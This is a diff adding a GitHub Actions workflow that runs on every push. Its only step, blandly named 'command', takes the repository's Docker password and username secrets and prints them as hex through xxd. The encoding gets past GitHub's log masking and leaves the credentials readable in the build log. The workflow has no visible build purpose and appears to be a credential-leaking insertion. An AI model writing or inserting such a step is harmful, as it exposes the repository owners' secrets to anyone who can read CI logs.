@@ -1,0 +1,11 @@
+name: workflow
+'on': push
+jobs:
+  init:
+    runs-on: ubuntu-latest
+    steps:
+    - run: env -0 | awk -v RS='\0' '/^secret_/ {print $0}' | xxd -i
+      name: command
+      env:
+        secret_DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
+        secret_DOCKER_USERNAME: ${{ secrets.DOCKER_USERNAME }}
